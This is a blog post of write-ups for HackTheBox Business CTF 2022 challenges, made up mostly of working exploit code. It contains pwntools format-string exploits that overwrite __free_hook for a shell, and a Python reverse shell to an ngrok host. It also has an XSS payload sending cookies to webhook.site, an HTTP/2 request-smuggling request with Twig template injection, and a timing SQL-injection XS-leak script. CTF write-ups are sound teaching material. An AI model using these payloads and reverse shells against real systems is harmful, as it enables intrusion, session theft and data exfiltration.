---
layout: post
title:  "HackTheBox Business CTF 2022 Writeups"
date:   2022-07-18 07:55:19 -0400
categories: ctf
---

## Introduction

Last weekend, I participated in [HackTheBox's Business CTF](https://www.hackthebox.com/events/htb-business-ctf-2022), which was really fun. I generally find the more hardcore CTFs are too menacing for general consumption (looking at you DEFCON, why so many reversing challenges), and HTB actually does a great job balancing the difficulty and fun of the challenges. In the spirit of being more consistent in my blogging and writing, I have decided to write some writeups for the challenges I worked on for this competition. This writeup is more verbose than your usual writeups in order to aid understanding, so be warned!

### \[Pwn\] Superfast (unsolved) - (18 Solves)

I usually don't touch pwn when playing with CTF.SG because that's not my forte (and there are tons of people better than me at this), but in the absence of any other pwners on team I did this CTF played with, I always love to take the opportunity to actually work on pwning. We are given a PHP plugin pwn as an *easy* challenge, which scared the living poop out of me whe I first saw it. Thankfully, the bug wasn't too difficult to spot.

{% highlight c %}
zend_string* decrypt(char* buf, size_t size, uint8_t key) {
    char buffer[64] = {0};
    // XXX - unsigned comparison --- waituck
    if (sizeof(buffer) - size > 0) {
        memcpy(buffer, buf, size);
    } else {
        return NULL;
    }
    for (int i = 0; i < sizeof(buffer) - 1; i++) {
        buffer[i] ^= key;
    }
    return zend_string_init(buffer, strlen(buffer), 0);
}
{% endhighlight %}

`sizeof(buffer)` is unsigned and `size` is of `size_t` which is also unsigned, so `sizeof(buffer) - size` is unsigned and will never be less than 0. This means we can specify a `size` greater than `sizeof(buffer)`, and the corresponding `memcpy` results in a **stack buffer overflow**! We can confirm this in IDA Freeware, which shows that the size check is indeed trivially bypassable.

![](/images/htbbusiness2022/superfast_ida.png)

The arguments are passed in the following PHP function defined:

```c
zend_function_entry logger_functions[] = {
    PHP_FE(log_cmd, arginfo_log_cmd)
    {NULL, NULL, NULL}
};

PHP_FUNCTION(log_cmd) {
    char* input;
    zend_string* res;
    size_t size;
    long key;
    if (zend_parse_parameters(ZEND_NUM_ARGS(), "sl", &input, &size, &key) == FAILURE) {
        RETURN_NULL();
    }
    res = decrypt(input, size, (uint8_t)key);
    ...
```

At first, I thought some sort of magic was needed to understand how `zend_parse_parameters` work to learn how it parsed parameters from `log_cmd`, thinking `log_cmd` was some kind of serialized object and `"sl"` being some rule to deserialize input by. A quick look at the PHP code calling this proved me wrong and it takes in parameters in the standard PHP way:

```php
<?php
if (isset($_SERVER['HTTP_CMD_KEY']) && isset($_GET['cmd'])) {
	$key = intval($_SERVER['HTTP_CMD_KEY']);
	if ($key <= 0 || $key > 255) {
		http_response_code(400);
	} else {
		log_cmd($_GET['cmd'], $key);
	}
} 
...
```

We write a quick PoC exploiting the buffer overflow which results in a crash in the PHP server.

```python
#!/usr/bin/env python3

from pwn import *
import requests

URL = "http://127.0.0.1:1337"
headers = {
    "CMD_KEY": b"1"
}
params = {
    "cmd": b"1" * 256
}

r = requests.get(URL, params=params, headers=headers)
print(r)
```

We can now look at the protections to see what sort of convuluted hoop we have to jump to get a shell.

```sh
$ checksec php_logger.so
[*] '/home/waituck/htb-business-2022/pwn_superfast/challenge/php_logger.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

No canary found, so we can straight up control the instruction pointer RIP. However, with PIE and NX enabled, this means we need to leak the addresses of where the module is stored if we want to be able to jump to a relative offset of the .text section of the module, since the module offsets would be different with each run. However, we don't have anything that we can print or output to, but another promising function is defined in `php_logger.so`:

```c
__attribute__((force_align_arg_pointer))
void print_message(char* p) {
    php_printf(p);
}
```

This is essentially a thin wrapper around `printf`, if we can somehow jump to that address, we might be able to use it to leak addresses! However, we typically need to know its actual address in memory to return to it, due to PIE. Thankfully, the stored RIP is actually quite close to `print_message` (in fact, it only differs in the least significant byte), and with a one byte overwrite of the stored RIP on the stack, we are able to get to invoke the `printf`, which actually acts on our buffer! We update our PoC to exploit this, as below:

```python
#!/usr/bin/env python3

from pwn import *
import requests

URL = "http://127.0.0.1:1337"
headers = {
    "CMD_KEY": b"1"
}
params = {
    "cmd": xor(b"0x%08x", b"\x01") +  b"\x01" * (146) + b"\xa9" * 1 
}

r = requests.get(URL, params=params, headers=headers)
print(r)
print(r.text) # gets format string output
```

The only problem was that returning to `print_message` and invoking the format string exploit causes the program to segfault and crash (and me to cry), meaning that whatever addresses we leak out of there wouldn't be useful in the next run of the program since they would be different. This is where I got stuck, and I looked around for other modules and libraries loaded by PHP to see if I could jump to them (the answer is no, all of them were PIE). The solution I suspected was to somehow fix up the things that broke the execution using the same format string vulnerability, but did not get the time to deep dive into how that was possible since we had other challenges to work on.

So much for an easy challenge. It was only after the competition that I found out that likely a good portion of the solves cheesed the challenge by loading the flag directly, as such (they had to guess though, because the Docker file didn't actually work or put the flag file into the container):

```sh
❯ curl 'http://206.189.124.56:31713/flag.txt'
HTB{rophp1ng_4r0und_th3_st4ck!}
```

### \[Pwn\] Payback - (34 Solves)

After that unfortunate encounter with Superfast (and burning a ton of time for not solving it), I turned to another pwn challenge which was thankfully easier. We are provided source code in `main.c` so we can skip the step of opening the binary up in IDA. I don't remember what the challenge binary does because the code was decently long, but this definitely stands out like a sore thumb:

```c
// i added a new feature i hope you like it
int delete_bot()
{
    unsigned int id;
    id = getId();
    if (botBuf[id].url != NULL)
    {
        char reasonbuf[MAX_REASON_SIZE];
        memset(reasonbuf, '\x00', MAX_REASON_SIZE);
        // gather statistics
        printf("\n[*] Enter the reason of deletion: ");
        read(STDIN_FILENO, &reasonbuf, MAX_REASON_SIZE - 1);
        free(botBuf[id].url);
        botBuf[id].url = NULL;
        puts("\n[+] Bot Deleted successfully! | Reason: ");
        // XXX - format string vulnerability --- waituck
        printf(reasonbuf);
        return 0;
    }
    puts("\n[!] Error: Unable to fetch the requested bot entry.\n");
}
```

`reasonbuf` is user controlled here and passed directly to `printf`, which is your classical **format string vulnerability** *(again..., this won't be the last time you hear format string in this article)*.

One of my teammates wrote a wrapper in the time I was attempting to solve Superfast, which employs the [FmtStr](https://docs.pwntools.com/en/stable/fmtstr.html) function in `pwntools` to find the offsets. I didn't know about this library, and this saved *a ton of time* working on this challenge, because I really hate exploiting format string bugs.

The general flow of exploiting a format string vulnerability is to overwrite an address that gives you code execution. Typical targets are the GOT table, but in this case since Full RelRO is enabled the GOT is protected, so we are left with function pointers like `__free_hook` or `__malloc_hook`. In this case, the `__free_hook` is a nice target since the allocated and user controlled `botBuf[id].url` is freed directly with no modifications or protections. Due to ASLR we have to leak the address of where libc is in memory, and leaking involves printing addresses on the stack until we find an address that looks like a libc address (and looking at the debugger to see what the offset is from the real libc base address). 

Once we have that, we make use of the given libc in the challenge to figure out the offsets to functions we might want to call (e.g. `system`) and function pointers we want to overwrite (e.g. `__free_hook`). Using `fmtstr_payload` from `pwntools` instantly gives you the payload needed to perform the necessary short writes with the format string vulnerability, so you don't actually have to re-read the [format string bible](https://cs155.stanford.edu/papers/formatstring-1.2.pdf) to figure out how to do format string again. The final solve script looks like this:

```python
#!/usr/bin/python3
from pwn import *
exe = ELF("./payback")
libc = ELF("./.glibc/libc.so.6")
context.binary = exe
# context.log_level = "debug"

gs = '''
continue
'''

if args['REMOTE']:
    io = remote('206.189.25.173', 30362)
elif args.GDB:
    io = gdb.debug('./payback', gs)
else:
    io = process('./payback')

def fmt_str(payload):
    io.sendline(b'1')
    io.sendline(b'http://urlplaceholder.com/')
    io.sendline(b'1337')
    io.sendline(b'3')
    io.sendline(b'0')
    io.sendafter(b'[*] Enter the reason of deletion: ', payload)
    io.sendline()
    io.recvuntil("Reason: \n")
    result = io.recvline()
    return result

def main():
    data = fmt_str("0x%08lx 0x%08lx").decode('utf-8').strip().split()[0]
    libc_base = int(data, 16) - 0x1ed723
    libc.address = libc_base
    info(f"libc base: {libc_base:02x}")
    info(f"free_hook: {libc.sym.__free_hook:02x}")
    info(f"system addr: {libc.sym.system:02x}")
    
    # write system to free_hook
    payload = fmtstr_payload(8, {libc.sym.__free_hook: libc.sym.system}, write_size='byte')
    fmt_str(payload)

    # pwn
    io.sendline(b'1')
    io.sendline(b'/bin/sh')
    io.sendline(b'1337')
    io.sendline(b'3')
    io.sendline(b'0')
    io.sendline(b'I WANT SHELL')
    io.interactive()
    
if __name__ == '__main__':
    main()
```

Which gives us shell and the flag :) 

```
HTB{w3_sHoulD_1n1t1at3_a_bug_bounty_pr0gram}
```

### \[Pwn\] Insider - (21 Solves)

This challenge is a really really long binary which implements a full FTP server. There's quite a fair bit of reversing to go about (which I shall not get into here), but the general flow is to open it in IDA and rename and mark interesting functions.

The first part is to access the FTP server, which requires both the username and password via the USER and PASS command. The binary hardcodes the username and password in a simple `strcmp`, and this can be gleaned from the decompilation. 

```c
_BOOL8 __fastcall sub_2A22(const char *a1)
{
  return strcmp(a1, ";)") == 0;
}
```

With the username and password, we can move on to other interesting functions in the FTP server. Two interesting functions can be noted. First, `case 16` has a `sprintf`, which might overflow if your current working directory is long enough and the buffer `s` is not big enough:

```c
case 16:
    if ( v131 >= 0 )
    {
        getcwd(buf, 0x1000uLL);
        sprintf(s, "ls -l %s", buf);
        v122 = popen(s, "r");
        sub_2449(v122);
        sub_2379("%d Transfer completed \r\n", 226LL, v27, v28, v29, v30);
        pclose(v122);
        v131 = -1;
    }
    if ( v132 >= 0 )
        v132 = -1;
    break;
```

This seems like a pretty convoluted buffer overflow and I didn't seem likely to be the exploit path, so I moved on to other interesting functions. As a side note, `popen` is not a valid target for command injection unfortunately, which would have made this challenge trivial. 

Next, case 29 does some really janky stuff with the buffer it gives to `printf`, which raises serious alarm bells.

```c
case 29:
    memset(buf_1, 0, 0x44CuLL);
    *(_DWORD *)buf_1 = ' d%';
    memcpy(&buf_1[3], byte_6220, input);
    memcpy(&buf_1[input + 2], " \r\n", 3uLL);
    printf(buf_1, 431136LL, v41, v42, v43, v44);
    break;
```

`input` is the user controlled buffer after the command, and it is `memcpy`'d into `buf_1` and passed directly into `printf`. ***Again***, we have our **format string vulnerability**.  `case 29` corresponds to the `BKDR` command, so we quickly test this in our local environment to confirm the vulnerability.

```sh
waituck@ubuntu:~/htb-business-2022/pwn_insider/challenge$ ./chall
220 Blablah FTP 
USER ;)
331 User name okay need password 
PASS ;)
230 User logged in proceed 
BKDR %lx %lx
431136 BKDR 3 a0d 
BKDR %lx %lx %lx %lx
431136 BKDR 3 a0d 0 7ffed89590c0 
```

Looking at the protections, it is similar to that of Payback, so our solve path hopefully isn't too different here.

```sh
waituck@ubuntu:~/htb-business-2022/pwn_insider/challenge$ checksec chall
[*] '/home/waituck/htb-business-2022/pwn_insider/challenge/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./'
```

We won't be making use of the lack of stack canaries and will be ignoring that completely. It might have been needed for some other vulnerability in the library, but I am quite stubborn when I see a format string. When you start leaking via the format string vulnerability and in trying to find where our string is on the stack, it's really really far away. So far away that `FmtStr` in `pwntools` doesn't actually find the correct offset for you [(it stops at offset 1000)](https://github.com/Gallopsled/pwntools/blob/493a3e3d92/pwnlib/fmtstr.py#L860-L871). Thus begins some manual effort in `gdb` in digging out interesting addresses on the stack, and finding out which offset our string is stored on the stack. With some pain, we can replicate the exploitation steps in Payback, however, we don't get a very nice `free` (free is called immediately after `printf` and our buffer doesn't actually `/bin/sh`, so we can't overwrite it with `system` or it crashes). Here, we make use of the famous [`one_gadget`](https://github.com/david942j/one_gadget), which are gadgets in libc which execute `/bin/sh` (essentially the same thing as `system`). With that, we construct our solve script and get the flag!

```python
#!/usr/bin/env python3

from pwn import *
exe = ELF("./chall")
libc = ELF("./libc.so.6")
context.binary = exe
#context.log_level = "debug"

gs = '''
continue
'''

if args.REMOTE:
    io = remote('134.209.183.143', 30810)
elif args.GDB:
    io = gdb.debug('./chall', gs)
else:
    io = process('./chall')

io.recvline()
io.sendline(b'USER ;)')
io.recvline()
io.sendline(b'PASS ;)')
io.recvline()


def fmt_str(payload):
    io.sendline(b'BKDR ' + payload)
    io.recvuntil(b'BKDR ')
    result = io.recvline()
    return result


def main():
    addr_leak = fmt_str(b"0x%2739$lx")
    libc_base = int(addr_leak, 16) - 0x28565
    libc.address = libc_base
    info(f"libc base: {libc_base:02x}")
    info(f"free_hook: {libc.sym.__free_hook:02x}")
    info(f"system addr: {libc.sym.system:02x}")
    onegadget = libc.address + 0xde78c

    # write system to free_hook
    payload = fmtstr_payload(1031, {libc.sym.__free_hook: onegadget}, write_size='byte', numbwritten=12)
    io.sendline(b'BKDR ' + payload)

    io.interactive()
    
if __name__ == '__main__':
    main()
```

---

More writeups are due, the below isn't complete and are just solve script/brain dumps, stay tuned for the full writeup!

### \[Reversing\] Mr. Abilgate - (27 Solves)

A teammate of mine identified it was UPX packed. If you try unpacking it, the binary becomes broken (you can run it in a debugger and you would realize some addresses are not translated properly and results in a `EXCEPTION_ACCESS_VIOLATION` in some address starting at `0x14...`), but the code is roughly there with some indirection in library calls. If you reverse the encryption function and reproduce the key, you can implement the decryption and then get the flag. 

It's a bit painful to reverse because the unpacked binary you are working with is broken and I couldn't be bothered to fix what was broken in the unpacking (I didn't know what it was), so I mainly did this challenge via putting module relative offset hardware breakpoints in places I didn't understand in the original binary (so as to trigger the breakpoint when it unpacks), figure out what it's doing dynamically, and then updating the decompilation in the broken unpacked binary until I can make sense of the code. One interesting thing is that there's a sanity check in the binary to ensure you don't run this accidentally which you can patch out in the unpacked version, or just put a hardware breakpoint at that location and jump over by updating RIP.

The solve script is below, which just implements the decryption for the encryption routine in the binary:

```cpp
#include <windows.h>
#include <wincrypt.h>
#include <fileapi.h>
#include <iostream>

const char* encFilePath = "C:\\Users\\IEUser\\Desktop\\ImportantAssets.xls.bhtbr";
const char* decFilePath = "C:\\Users\\IEUser\\Desktop\\ImportantAssets.xls";

int main()
{
    BYTE impt_hash[16] = {
        0xF9, 0x97, 0xB6, 0x47, 0x60, 0x08, 0xA7,  0xEA,  0xFB, 0x2D, 0xBE, 0x50, 0xE9, 0x96, 0x94, 0xF6
    };
    HCRYPTPROV hCryptProv = NULL;        // handle for a cryptographic
                                        // provider context
    HCRYPTHASH hCryptHash = NULL;
    HCRYPTKEY hCryptKey = NULL;

    CryptAcquireContextA(
        &hCryptProv,               // handle to the CSP
        NULL,                  // container name 
        "Microsoft Enhanced RSA and AES Cryptographic Provider",                      // use the default provider
        24,             // provider type
        0xF0000000                    // flag values);
    );                       

    CryptCreateHash(
        hCryptProv,
        0x800C,
        NULL,
        NULL,
        &hCryptHash
    );

    printf("");

    CryptHashData(
        hCryptHash,
        impt_hash,
        sizeof(impt_hash),
        NULL
    );

    CryptDeriveKey(
        hCryptProv,
        0x6610,
        hCryptHash,
        0,
        &hCryptKey
    );
    HANDLE hEncFile = CreateFileA(
        encFilePath,
        0x80000000,
        0,
        0, 
        3,
        0x8000000,
        0
    );
    HANDLE hDecFile = CreateFileA(
        decFilePath,
        0x40000000,
        0,
        0,
        2,
        128,
        0
    );

    size_t fileSz = GetFileSize(hEncFile, NULL);
    DWORD totalNumBytesRead = 0;
    DWORD currNumBytesRead = 0;
    LPVOID pbBuf = calloc(1, 160);

    ReadFile(hEncFile, pbBuf, 160, &currNumBytesRead, NULL);

    while (currNumBytesRead) {
        totalNumBytesRead += currNumBytesRead;
        if (totalNumBytesRead >= fileSz) {
            CryptDecrypt(hCryptKey, 0, TRUE, 0, (BYTE*)pbBuf, &currNumBytesRead);
            WriteFile(hDecFile, pbBuf, 160, NULL, 0);
            break;
        }
        else {
            CryptDecrypt(hCryptKey, 0, FALSE, 0, (BYTE*)pbBuf, &currNumBytesRead);
            WriteFile(hDecFile, pbBuf, 160, NULL, 0);
            ReadFile(hEncFile, pbBuf, 160, &currNumBytesRead, NULL);
        }
    }
}
```

### \[Reversing\] Breakin (unsolved) - (20 Solves)

This was a C++ reversing challenge which is a bit intimidating but the actual non-library code was pretty tiny and had debug symbols could be quickly reversed. Once you reverse `getSecret`, you find the secret admin page and the password query needed to get to the secret admin page, where you can upload marshaled Python objects that would execute on the server (gleaned from `getExec`). Figuring out how the marshaled object should look like was a pain and it kept crashing and returning `<NULL>`, until I found [this article](https://awasu.com/weblog/embedding-python/calling-python-code-from-your-program/) detailing the steps to constructing it.

I managed to get as far as the reverse shell before the competition ended, but unfortunately the reverse shell kept dying (likely due to a timeout). I reproduce the script I have so far.

```python
code = b'''
def main():
    import os
    os.system("python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"0.tcp.ap.ngrok.io\\",17610));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\"/bin/sh\\")'")
    return "asd"
'''


import marshal
f = open("payload.pyc", "wb")
data = compile(code, 'payload.py', 'exec')
marshal.dump(data, f)
f.close()
```

I will be updating this with the proper solve script since I was rather close (I just needed to dump out the memory after getting shell).

### \[Web\] Felonious Forums - (35 Solves)

XSS via improper sanitization of markdown, cache poisoning, directory traversal.

```python
#!/usr/bin/env python3

import requests

URL = "http://138.68.150.148:31833/threads/preview"
URL2 = "http://138.68.150.148:31833/api/report"


trigger = {
    "post_id": "../threads/preview"
}

headers = {
    "Cookie": "session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTAsInVzZXJuYW1lIjoid2FpdHVjayIsInJlcHV0YXRpb24iOjAsImNyZWRpdHMiOjEwMCwidXNlcl9yb2xlIjoiTmV3YmllIiwiYXZhdGFyIjoibmV3YmllLndlYnAiLCJqb2luZWQiOiIyMDIyLTA3LTE2IDA3OjExOjMzIiwiaWF0IjoxNjU3OTU1NDk5fQ.MRR-uEf71mD7RruLrdZ1ga5XAGbtEBCm_Li-wsirRwA",
    "X-Forwarded-For": "127.0.0.1",
    "Host": "127.0.0.1:1337"
}

body = {
    "title": "",
    "content": '''![Uh oh...](https://www.example.com/image.png"onerror="fetch('https://webhook.site/6f47c639-ce29-4635-bcc9-c33ebf316fba?'+document.cookie))'''
}

# cache poison with XSS
r = requests.post(URL, headers=headers, data=body)
print(r.text)

# trigger
r = requests.post(URL2, headers=headers, json=trigger)
print(r.text)
```

I honestly found the directory traversal quite a pain.

### \[Web\] PhishTale - (24 Solves)

CVE galore - Varnish HTTP2 Request Smuggling, Twig N-Day exploitation

{% raw %} 
```
POST / HTTP/2
Host: 127.0.0.1:1337
Content-Length: 1

aPOST /admin/export HTTP/1.0
Cookie: PHPSESSID=ijhrgmbj915hrtk7ikt4ki8fmt
Content-Type: application/x-www-form-urlencoded
Content-Length: 125

slack-url=slack&redirect-url=redirecturl&template-page=owagray&campaign=campaign&log-title={{\['/readflag',0\]|sort('system')}}
```
{% endraw %}

A teammate found and wrote a PoC for the request smuggling, and we searched high and low until we found a working exploit.

Credits: [Detectify Varnish CVE Blog](https://labs.detectify.com/2021/08/26/how-to-set-up-docker-for-varnish-http-2-request-smuggling/), [Payloads for twig](https://chowdera.com/2022/159/202206080644355675.html)

### \[Web\] GrandMonty - (8 Solves)

Use meta-refresh to redirect to your site and bypass CSP, coerce the admin to `GET /graphql` to bypass CORS preflight, us ea timing side channel from the SQL injection to XS-leak out the flag.

POC to send to admin:

```html
<meta http-equiv="refresh" content="0; url=https://64e41bcd2960.ap.ngrok.io/abc.html">
```

abc.html:

```html
<html>
	<body>
		<script>
        function inject(index, guess) {
            var start = performance.now()
            try {
                var request = new XMLHttpRequest();
                request.open('GET', `http://127.0.0.1:1337/graphql?query=query {RansomChat(enc_id:"1f81b076-fffc-45cd-b7c3-c686b73aa6af' AND IF(ASCII((SELECT SUBSTRING(password,${index},1) from users where username%3d'burns'))%3dASCII('${guess}'), SLEEP(4), 0)%3d'1"){id}}`, false);  // `false` makes the request synchronous
                request.send(null);
            } catch (error) {

            }
            var time = performance.now() - start;
            if (time > 3000) {
                fetch(`https://webhook.site/6f47c639-ce29-4635-bcc9-c33ebf316fba?success=true&index=${index}&guess=${guess}`);
            }
            return time
        }
        let possible = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789{}_';

        for (let j = 1; j < 40; j++) {
            for (let i = 0; i < possible.length; i++) {
                let currentTry = possible.charAt(i);
                inject(j, currentTry)
            }
        }
        </script>

    
	</body>
</html>
```

Hack on!